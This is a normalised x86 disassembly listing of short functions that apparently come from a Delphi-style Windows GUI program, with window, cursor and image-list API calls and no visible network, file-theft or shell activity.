push 0x0
xor ecx ecx
mov edx 0xb009
call sub_43850c
sub_437540
cmp dl [ eax + 0x60 ]
je r-xdata
retn
mov [ eax + 0x60 ] dl
cmp [ eax + 0x30 ] 0x0
je r-xdata
test [ eax + 0x1c ] 0x2
jne r-xdata
push 0x0
xor ecx ecx
mov edx 0xb03d
call sub_43850c
sub_437564
cmp dx [ eax + 0x78 ]
je r-xdata
retn
mov [ eax + 0x78 ] dx
push 0x0
xor ecx ecx
mov edx 0xb00f
call sub_43850c
sub_437580
push ebx
mov ebx eax
call sub_434500
cmp ebx eax
sete al
pop ebx
retn
sub_4375b8
push esi
mov dl 0x1
mov si 0xffce
call sub_403430
pop esi
retn
sub_437709
mov eax esi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_43782c
test [ eax + 0x50 ] 0x40
setne cl
mov dl [ eax + 0x57 ]
call sub_4377a0
retn
sub_437880
push esi
mov esi [ eax + 0x30 ]
test esi esi
je r-xdata
pop esi
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x88 ]
sub_437894
mov edx [ eax ]
call [ edx + 0x80 ]
retn
sub_437998
xor eax eax
retn
sub_43799c
mov edx [ rw-data ]
cmp [ edx + 0xd ] 0x0
je r-xdata
xor eax eax
retn
cmp [ eax + 0x5f ] 0x0
jne r-xdata
mov al 0x1
retn
sub_4379b4
mov edx [ rw-data ]
cmp [ edx + 0xd ] 0x0
je r-xdata
xor eax eax
retn
cmp [ eax + 0x5f ] 0x1
je r-xdata
mov al 0x1
retn
sub_4379cc
mov edx [ rw-data ]
cmp [ edx + 0xd ] 0x0
je r-xdata
xor eax eax
retn
mov al [ eax + 0x5f ]
dec eax
sub al 0x2
jb r-xdata
mov al 0x1
retn
sub_4379e8
mov edx [ rw-data ]
mov ecx [ edx + 0x8 ]
mov edx [ rw-data ]
mov dl [ edx + 0x4 ]
call sub_437a00
retn
sub_437ac4
retn
sub_437ac8
cmp eax [ rw-data ]
sete al
retn
sub_437b36
pop ebp
retn 0x4
sub_437b3c
push ebx
cmp [ eax + 0x112 ] 0x0
je r-xdata
pop ebx
retn
mov ecx edx
mov ebx eax
mov edx eax
mov eax [ ebx + 0x114 ]
call [ ebx + 0x110 ]
sub_437c58
push ebp
mov ebp esp
push esi
mov si 0xffd2
call sub_403430
pop esi
pop ebp
retn 0x4
sub_437c92
pop ebp
retn 0x4
sub_437c98
push ebx
cmp [ eax + 0x102 ] 0x0
je r-xdata
pop ebx
retn
mov ecx edx
mov ebx eax
mov edx eax
mov eax [ ebx + 0x104 ]
call [ ebx + 0x100 ]
sub_437f36
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_437f40
push esi
mov esi eax
xor ecx ecx
mov eax esi
mov si 0xffe8
call sub_403430
pop esi
retn
sub_437f54
push esi
mov esi eax
mov cl 0x1
mov eax esi
mov si 0xffe8
call sub_403430
pop esi
retn
sub_4382cc
push esi
mov si 0xffee
call sub_403430
pop esi
retn
sub_4382d8
mov al 0x1
retn
sub_4385b0
mov ecx [ edx ]
mov [ eax + 0x40 ] ecx
mov ecx [ edx + 0x4 ]
mov [ eax + 0x44 ] ecx
mov ecx [ edx + 0x8 ]
sub ecx [ edx ]
mov [ eax + 0x48 ] ecx
mov ecx [ edx + 0xc ]
sub ecx [ edx + 0x4 ]
mov [ eax + 0x4c ] ecx
call sub_4369ac
retn
sub_4385d4
retn
sub_4387ed
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + 0x56 ] dl
mov esi edx
mov ebx eax
mov eax esi
call sub_416afc
mov [ ebx + 0x5e ] al
pop esi
pop ebx
retn
sub_438808
mov al [ eax + 0x5e ]
xchg edx eax
call sub_418e34
retn
sub_438900
push ebx
cmp [ eax + 0x12a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x12c ]
call [ ebx + 0x128 ]
sub_438f18
mov edx [ eax ]
call [ edx + 0x7c ]
retn
sub_438f20
mov edx [ eax ]
call [ edx + 0x7c ]
retn
sub_438f28
mov edx [ eax ]
call [ edx + 0x7c ]
retn
sub_438fe0
push esi
mov esi eax
mov eax [ rw-data ]
cmp [ eax + 0xd ] 0x0
je r-xdata
pop esi
retn
cmp [ edx + 0x4 ] 0x0
jne r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_439000
push ebx
mov ebx eax
cmp [ ebx + 0x9a ] 0x0
je r-xdata
pop ebx
retn
mov eax [ ebx + 0x30 ]
mov dl [ eax + 0x99 ]
mov eax ebx
call sub_4374a8
mov [ ebx + 0x9a ] 0x1
sub_439058
push ebx
mov ebx eax
cmp [ ebx + 0x56 ] 0x0
je r-xdata
pop ebx
retn
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax + 0x84 ]
mov eax ebx
call sub_43744c
mov [ ebx + 0x56 ] 0x1
sub_43907c
mov [ edx + 0xc ] 0x1
retn
sub_439084
mov edx [ eax + 0x30 ]
test edx edx
je r-xdata
retn
push eax
xor ecx ecx
mov eax edx
mov edx 0xb013
call sub_43850c
sub_43909c
mov edx [ eax + 0x30 ]
test edx edx
je r-xdata
retn
push eax
xor ecx ecx
mov eax edx
mov edx 0xb014
call sub_43850c
sub_4390b4
xor eax eax
mov [ edx + 0xc ] eax
retn
sub_439321
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_43934c
mov eax [ r-xdata ]
retn
sub_4394ef
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_439610
mov eax [ eax + 0xb8 ]
retn
sub_439678
push ebx
mov ebx eax
mov eax ebx
call sub_43799c
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax 0x20000
pop ebx
retn
sub_439694
mov edx [ eax + 0x6c ]
test edx edx
je r-xdata
retn
mov eax edx
mov edx [ eax ]
call [ edx + 0x1c ]
sub_43982c
mov eax [ eax + 0x74 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
retn
sub_43985c
mov edx [ eax ]
call [ edx + 0x34 ]
retn
sub_439864
call sub_436418
retn
sub_439bac
retn
sub_43a3d8
inc [ eax + 0x160 ]
retn
sub_43a3e0
dec [ eax + 0x160 ]
cmp [ eax + 0x160 ] 0x0
jne r-xdata
retn
test [ eax + 0x54 ] 0x10
je r-xdata
call sub_43a400
sub_43a400
xor edx edx
call sub_43a344
retn
sub_43a4d4
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_43aaf1
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_43acc0
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_43ad94
mov ecx [ eax ]
cmp ecx [ edx ]
jne r-xdata
xor eax eax
retn
mov eax [ eax + 0x4 ]
cmp eax [ edx + 0x4 ]
je r-xdata
mov al 0x1
retn
sub_43af88
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x180 ] edx
pop ecx
pop ebp
retn
sub_43b078
xor eax eax
retn
sub_43b0e0
cmp [ eax + 0x180 ] 0x0
je r-xdata
retn
push 0x0
xor ecx ecx
mov edx 0xb033
call sub_43850c
j_sub_4036bc#9
jmp sub_4036bc
sub_43b34a
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
j_sub_4036bc#8
jmp sub_4036bc
sub_43b359
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
call sub_456e58
call sub_403a24
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_43b91b
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_43b924
add esp 0xfffffff0
mov [ esp ] 0xf
mov [ esp + 0x4 ] edx
xor edx edx
mov [ esp + 0x8 ] edx
xor edx edx
mov [ esp + 0xc ] edx
mov edx esp
mov ecx [ eax ]
call [ ecx - 0x10 ]
add esp 0x10
retn
sub_43be74
push ebx
mov ebx eax
call sub_41b88c
push 0x0
xor ecx ecx
mov edx 0xb024
mov eax ebx
call sub_43850c
pop ebx
retn
sub_43be90
mov ecx [ edx + 0x8 ]
push ecx
mov ecx [ edx + 0x4 ]
mov edx 0xb025
call sub_43850c
retn
sub_43bea4
push 0x0
xor ecx ecx
mov edx 0xb026
call sub_43850c
retn
sub_43beb4
push 0x0
xor ecx ecx
mov edx 0xb027
call sub_43850c
retn
sub_43c160
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax esi
call sub_43de50
pop esi
retn
sub_43c274
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax esi
call sub_43c2c4
pop esi
retn
sub_43c288
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax esi
call sub_43c3b0
pop esi
retn
sub_43c29c
push esi
mov esi eax
mov [ esi + 0x1f9 ] 0x1
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop esi
retn
sub_43c2b0
push esi
mov esi eax
mov [ esi + 0x1f9 ] 0x0
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop esi
retn
sub_43c3aa
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_43c441
pop ebx
pop ecx
pop ebp
retn
sub_43c448
push esi
mov esi edx
mov edx eax
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x68 ]
pop esi
retn
sub_43c458
retn
sub_43c45c
push ebx
cmp [ eax + 0x1c2 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x1c4 ]
call [ ebx + 0x1c0 ]
sub_43c47c
push ebx
cmp [ eax + 0x1ca ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x1cc ]
call [ ebx + 0x1c8 ]
sub_43c5dc
mov edx [ eax + 0x178 ]
test edx edx
je r-xdata
xor eax eax
retn
mov eax [ edx + 0x8 ]
retn
sub_43c6ac
retn
sub_43c7cb
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_43c8c0
xor ecx ecx
mov [ edx + 0xc ] ecx
cmp [ eax + 0x1a7 ] 0x0
je r-xdata
retn
cmp [ eax + 0x17c ] 0x0
je r-xdata
mov edx [ edx + 0x8 ]
mov eax [ eax + 0x17c ]
mov ecx [ eax ]
call [ ecx + 0x28 ]
sub_43cb24
push ebx
cmp [ eax + 0x1e2 ] 0x0
je r-xdata
pop ebx
retn
mov ecx edx
mov ebx eax
mov edx eax
mov eax [ ebx + 0x1e4 ]
call [ ebx + 0x1e0 ]
sub_43cdc8
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
xor eax eax
mov [ esi + 0x180 ] eax
mov [ esi + 0x1a6 ] 0x0
pop esi
retn
sub_43cea4
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov dx 0xb023
mov eax esi
call sub_43a8d0
pop esi
retn
sub_43cf68
push esi
mov si 0xffc1
call sub_403430
pop esi
retn
sub_43cf94
push ebx
mov ecx [ eax + 0x30 ]
test ecx ecx
je r-xdata
pop ebx
retn
mov ebx ecx
mov eax [ ebx + 0x3c ]
call [ ebx + 0x38 ]
sub_43cfa8
push ebx
mov ecx [ eax + 0x30 ]
test ecx ecx
je r-xdata
pop ebx
retn
mov ebx ecx
mov eax [ ebx + 0x3c ]
call [ ebx + 0x38 ]
sub_43cfbc
call sub_43a890
retn
sub_43cfc4
call sub_43a890
retn
sub_43cfcc
call sub_43a890
retn
sub_43d074
push ebx
mov ebx eax
mov eax ebx
call sub_438f28
mov edx [ ebx + 0x70 ]
mov eax [ ebx + 0x170 ]
call sub_41ca04
mov dx 0xb009
mov eax ebx
call sub_43a8d0
pop ebx
retn
sub_43d1d8
call sub_43a890
retn
sub_43d1e0
call sub_43a890
retn
sub_43d1e8
call sub_43a890
retn
sub_43d1f0
call sub_43a890
retn
sub_43d254
push ebx
mov ecx [ eax + 0x30 ]
test ecx ecx
je r-xdata
pop ebx
retn
mov ebx ecx
mov eax [ ebx + 0x3c ]
call [ ebx + 0x38 ]
sub_43d6f1
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_43d7d0
push esi
mov esi [ eax + 0x30 ]
test esi esi
je r-xdata
pop esi
retn
mov edx eax
mov eax esi
mov ecx [ eax ]
call [ ecx + 0xc0 ]
sub_43d974
push 0x0
xor ecx ecx
mov edx 0xb034
call sub_43850c
retn
sub_43da14
push ebx
mov ebx eax
mov eax ebx
call sub_43de44
test al al
je r-xdata
pop ebx
retn
mov eax [ ebx + 0x180 ]
push eax
call UpdateWindow
sub_43da30
push ebx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0x88 ]
pop ebx
retn
sub_43dc08
push ebx
push esi
mov esi edx
mov ebx eax
push esi
mov eax ebx
call sub_43db40
push eax
call GetClientRect
pop esi
pop ebx
retn
sub_43dc60
cmp edx [ eax + 0x16c ]
je r-xdata
retn
mov [ eax + 0x16c ] edx
push 0x0
xor ecx ecx
mov edx 0xb03b
call sub_43850c
sub_43dc80
cmp dl [ eax + 0x1a5 ]
je r-xdata
retn
mov [ eax + 0x1a5 ] dl
mov [ eax + 0x1a9 ] 0x0
push 0x0
xor ecx ecx
mov edx 0xb010
call sub_43850c
sub_43dca4
mov al [ eax + 0x1a9 ]
xor al 0x1
retn
sub_43dcb0
cmp dl [ eax + 0x1a9 ]
je r-xdata
retn
mov [ eax + 0x1a9 ] dl
cmp [ eax + 0x30 ] 0x0
je r-xdata
test [ eax + 0x1c ] 0x2
jne r-xdata
push 0x0
xor ecx ecx
mov edx 0xb011
call sub_43850c
sub_43dd5c
test [ eax + 0x54 ] 0x8
je r-xdata
call sub_43dd00
retn
movsx edx dx
mov [ eax + 0x1a0 ] edx
retn
sub_43de3f
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_43e065
mov eax [ ebp - 0xc ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_43e16c
call sub_4382dc
retn
sub_43e650
mov eax [ r-xdata ]
retn
sub_43e8c8
cmp dl [ eax + 0x165 ]
je r-xdata
retn
mov [ eax + 0x165 ] dl
push 0x0
xor ecx ecx
mov edx 0xb03b
call sub_43850c
sub_43ed20
test [ eax + 0x52 ] 0x4
setne al
retn
sub_43ee83
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x160 ]
call sub_41d0b4
retn
sub_43eeac
retn
sub_43ef80
mov [ edx + 0xc ] 0xffffffff
retn
sub_43efe5
pop ecx
pop ecx
pop ebp
retn
sub_43f08c
pop ebx
mov esp ebp
pop ebp
retn
sub_43f0f8
call sub_43b098
retn
sub_43f192
pop esi
pop ecx
pop ecx
pop ebp
retn
sub_43f378
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_43f5e8
cmp dx [ eax + 0x68 ]
je r-xdata
retn
mov [ eax + 0x68 ] dx
cmp [ eax + 0x6a ] 0x0
je r-xdata
call sub_43f4d4
sub_43f72c
push ebx
mov ebx eax
mov eax ebx
call sub_444434
test al al
je r-xdata
pop ebx
retn
push 0xffffffff
call ImageList_DragShowNolock
sub_43f744
push ebx
mov ebx eax
mov eax ebx
call sub_444434
test al al
je r-xdata
pop ebx
retn
push 0x0
call ImageList_DragShowNolock
sub_43f830
push ebx
push esi
mov esi edx
mov ebx eax
or [ ebx + 0x54 ] 0x100
mov edx esi
mov eax ebx
call sub_43bcd0
and [ ebx + 0x54 ] 0xfeff
pop esi
pop ebx
retn
sub_43f8d2
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43f8f5
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
call sub_41d0b4
retn
sub_43f8f5
pop ebx
pop ecx
pop ebp
retn
sub_43f8fc
retn
sub_43f964
xor edx edx
mov eax [ eax + 0x8 ]
test eax eax
je r-xdata
mov eax edx
retn
mov eax [ eax + 0xc ]
inc edx
test eax eax
jne r-xdata
sub_43feb8
mov eax [ eax + 0x8 ]
jmp r-xdata
mov edx [ eax + 0xc ]
test edx edx
jne r-xdata
mov eax edx
retn
sub_440154
mov eax [ eax + 0x14 ]
mov al [ eax + 0x5b ]
dec eax
sub al 0x2
jae r-xdata
add [ ecx + 0x4 ] 0xc
retn
add [ ecx ] 0xc
retn
sub_440168
inc [ eax + 0x6c ]
retn
sub_44016c
dec [ eax + 0x6c ]
cmp [ eax + 0x6c ] 0x0
jg r-xdata
retn
xor edx edx
mov [ eax + 0x6c ] edx
call sub_4419ec
sub_4402cc
call sub_4409cc
test eax eax
je r-xdata
xor eax eax
retn
mov eax [ eax + 0x4 ]
retn
sub_440c7e
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_440c9b
lea eax [ ebp - 0xc ]
call sub_403f6c
retn
sub_440c9b
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_440f83
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_440fa0
mov eax [ ebp - 0x4 ]
call sub_41d0b4
retn
sub_440fa0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_440fbd
mov eax [ ebp - 0x4 ]
call sub_403234
retn
sub_440fbd
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_441478
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_44160a
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_4416c6
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_44180c
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4418c8
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_4401d8
mov [ ebx + 0x38 ] eax
pop esi
pop ebx
retn
sub_441a14
cmp [ eax + 0x6c ] 0x0
jne r-xdata
retn
mov eax edx
call sub_43fd14
sub_44231b
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4423e4
call GetCapture
retn
sub_4423ec
push ebx
mov ebx edx
push ebx
call GetCursorPos
call sub_40c738
pop ebx
retn
sub_4423fc
push ebx
mov ebx eax
push 0x13
mov eax [ rw-data ]
mov eax [ eax ]
call eax
cmp eax 0x1
sbb eax eax
inc eax
mov [ ebx + 0xc ] al
pop ebx
retn
sub_44285c
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
retn
push eax
call [ rw-data ]
retn
sub_442a77
pop ebx
mov esp ebp
pop ebp
retn
sub_442ac2
add [ eax ] al
push ebx
mov ebx eax
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0xe0 ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0xe4 ]
pop ebx
retn
sub_442b46
pop ebp
retn
sub_442bd5
pop ebp
retn
sub_443000
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
hlt
sub_443324
mov edx [ eax + 0x5c ]
test edx edx
je r-xdata
or eax 0xffffffff
retn
mov edx [ edx + 0x30 ]
xchg edx eax
call sub_41389c
retn
sub_44333c
mov al 0x1
retn
sub_443340
mov edx [ eax + 0x5c ]
test edx edx
je r-xdata
call sub_419610
retn
mov eax edx
retn
sub_443350
cmp [ eax + 0x5c ] 0x0
je r-xdata
call sub_4195e0
retn
mov al 0x1
retn
sub_443640
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x30 ]
call sub_413840
pop esi
pop ebx
retn
sub_443654
mov eax [ eax + 0x30 ]
mov eax [ eax + 0x8 ]
retn
sub_443690
cmp edx [ eax + 0x38 ]
jne r-xdata
retn
mov edx [ eax ]
call [ edx + 0x30 ]
sub_4438f4
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4033c0
pop ebx
retn
sub_443908
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4033c0
pop ebx
retn
sub_44391c
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4033c0
pop ebx
retn
sub_443930
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4033c0
pop ebx
retn
sub_443944
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4033c0
pop ebx
retn
sub_443958
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4033c0
pop ebx
retn
sub_44396c
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4033c0
pop ebx
retn
sub_443980
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4033c0
pop ebx
retn
sub_443994
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4033c0
pop ebx
retn
sub_4439a8
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4033c0
pop ebx
retn
sub_4439bc
retn
sub_4439c0
retn
sub_4439c4
retn
sub_4439c8
retn
sub_4439cc
retn
sub_4439d0
retn
sub_4439d4
retn
sub_4439d8
retn
sub_4439dc
retn
sub_4439e0
retn
sub_4439e4
retn
sub_4439e8
retn
sub_444030
push ebx
mov ebx eax
cmp [ ebx + 0x90 ] 0x0
jne r-xdata
mov eax [ ebx + 0x90 ]
pop ebx
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_403204
mov [ ebx + 0x90 ] eax
sub_444058
push esi
mov si 0xffef
call sub_403430
pop esi
retn
sub_444100
pop ebp
retn
sub_444104
sub [ rw-data ] 0x1
jae r-xdata
retn
mov edx [ r-xdata ]
mov eax [ r-xdata ]
call sub_4130c8
mov edx [ r-xdata ]
mov eax [ r-xdata ]
call sub_4130c8
sub_4442a4
mov edx eax
sub edx 0xff000000
je r-xdata
mov eax 0x20000000
sub edx 0xffffff
jne r-xdata
retn
mov eax 0x1fffffff
retn
sub_444430
pop ebx
pop ecx
pop ebp
retn
sub_444434
cmp [ eax + 0x3c ] 0x0
setne al
retn
sub_44443c
cmp [ eax + 0x3c ] 0x0
jne r-xdata
retn
call sub_44460c
sub_4444f0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x54 ]
test eax eax
je r-xdata
pop ebx
mov esp ebp
pop ebp
retn
call sub_403234
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x54 ] edx
sub_4446a6
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_444745
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_444762
mov eax [ ebp - 0xc ]
call sub_403234
retn
sub_444762
mov eax [ ebp - 0x4 ]
mov si 0xffef
call sub_403430
mov eax [ ebp - 0x8 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_444822
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_444828
or edx 0xffffffff
call sub_44479c
retn
sub_444c3e
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_444c5b
mov eax [ ebp - 0xc ]
call sub_403234
retn
sub_444c5b
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_444c78
mov eax [ ebp - 0x4 ]
call sub_445770
retn
sub_444c78
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_444e83
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_444e88
push esi
mov esi eax
cmp dl [ esi + 0x40 ]
je r-xdata
pop esi
retn
mov [ esi + 0x40 ] dl
mov eax esi
mov si 0xffef
call sub_403430
sub_444ea0
push ebx
mov ebx edx
mov ecx ebx
xor edx edx
xor eax eax
call sub_4123e4
pop ebx
retn
sub_444f44
mov [ edx + 0x4 ] eax
mov ecx [ eax + 0x4c ]
test ecx ecx
je r-xdata
retn
mov eax ecx
call sub_4136e4
sub_445062
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
call sub_403234
retn
sub_445391
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4453ae
mov eax [ ebp - 0x10 ]
call sub_403234
retn
sub_4453ae
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4453cb
mov eax [ ebp - 0x8 ]
call sub_403234
retn
sub_4453cb
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_445729
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_44576c
inc [ eax + 0x5c ]
retn
sub_445770
push esi
cmp [ eax + 0x5c ] 0x0
jle r-xdata
cmp [ eax + 0x58 ] 0x0
je r-xdata
dec [ eax + 0x5c ]
pop esi
retn
mov [ eax + 0x58 ] 0x0
mov si 0xffef
call sub_403430
sub_4457c4
push ebx
cmp [ eax + 0xa ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx [ eax + 0x4 ]
mov eax [ ebx + 0xc ]
call [ ebx + 0x8 ]
sub_445808
pop ebp
retn
sub_44580c
sub [ rw-data ] 0x1
retn
sub_446717
jmp [ eax + eax ]
sub_446774
mov eax [ esp + 0x8 ]
retn
sub_44677c
push ebx
mov ebx eax
call sub_446774
push eax
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b35c
jmp sub_4039a8
sub_446798
pop ebx
retn
sub_446a18
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_446b6a
mov eax edi
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_446b80
push ebx
mov eax [ rw-data ]
call sub_413d40
mov ebx eax
movzx edx bx
mov cl 0x1
mov eax [ rw-data ]
call sub_413d14
mov eax ebx
pop ebx
retn
sub_446d08
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ r-xdata ]
call sub_4033e4
mov [ ebx + 0x18 ] eax
pop esi
pop ebx
retn
sub_446d24
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4033e4
mov al [ eax + 0x95 ]
mov edx [ ebx + 0x18 ]
cmp al [ edx + 0xa8 ]
sete al
pop ebx
retn
sub_447426
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_447525
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_44794f
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
sub_4482a3
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_448bcb
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_448f7d
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_448f8b
inc [ ecx ]
add [ eax ] al
add [ 0xffffffffb0000000 ] ch
add ebx eax
nop
cmp dl [ eax + 0x48 ]
je r-xdata
retn
mov [ eax + 0x48 ] dl
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0x3c ]
sub_449138
mov eax [ r-xdata ]
retn
sub_449174
cmp dx [ eax + 0x60 ]
je r-xdata
retn
mov [ eax + 0x60 ] dx
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0x3c ]
sub_449188
cmp dl [ eax + 0x3e ]
je r-xdata
retn
mov [ eax + 0x3e ] dl
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0x3c ]
sub_449198
cmp edx [ eax + 0x40 ]
je r-xdata
retn
mov [ eax + 0x40 ] edx
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0x3c ]
sub_4491a8
or edx 0xffffffff
mov ecx [ eax + 0x64 ]
test ecx ecx
je r-xdata
mov eax edx
retn
mov edx eax
mov eax ecx
call sub_4494a4
mov edx eax
sub_449240
push ebx
push esi
mov esi ecx
mov ebx edx
mov eax ebx
mov edx [ r-xdata ]
call sub_4033e4
mov edx esi
call sub_4491c0
pop esi
pop ebx
retn
sub_4492bc
mov edx [ eax + 0x44 ]
test edx edx
je r-xdata
retn
mov eax edx
mov edx [ eax ]
call [ edx + 0x1c ]
sub_4494a4
push esi
or ecx 0xffffffff
mov esi [ eax + 0x5c ]
test esi esi
je r-xdata
mov eax ecx
pop esi
retn
mov eax esi
call sub_41389c
mov ecx eax
sub_449694
mov edx [ eax + 0x64 ]
test edx edx
je r-xdata
mov eax edx
retn
cmp [ edx + 0x70 ] 0x0
je r-xdata
mov eax [ edx + 0x70 ]
retn
sub_4496fc
jmp r-xdata
mov edx [ eax + 0x64 ]
test edx edx
jne r-xdata
mov eax edx
mov eax [ eax + 0x70 ]
retn
sub_449aa4
cmp edx [ eax + 0x7c ]
jne r-xdata
retn
call sub_449ad8
sub_449ad8
mov edx sub_449ab0
mov ecx eax
mov eax [ eax + 0x68 ]
xchg edx eax
call sub_446c00
retn
sub_449cc9
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_44a1a6
mov al [ ebp - 0x1a ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_44a344
cmp dl [ eax + 0x3c ]
je r-xdata
retn
mov [ eax + 0x3c ] dl
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0x3c ]
sub_44a480
push ebp
mov ebp esp
push esi
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov eax [ eax + 0x34 ]
mov si 0xfffd
call sub_403430
pop esi
pop ebp
retn 0x8
sub_44a49c
mov eax [ eax + 0x34 ]
call sub_4476d4
retn
sub_44a4a8
push esi
mov esi eax
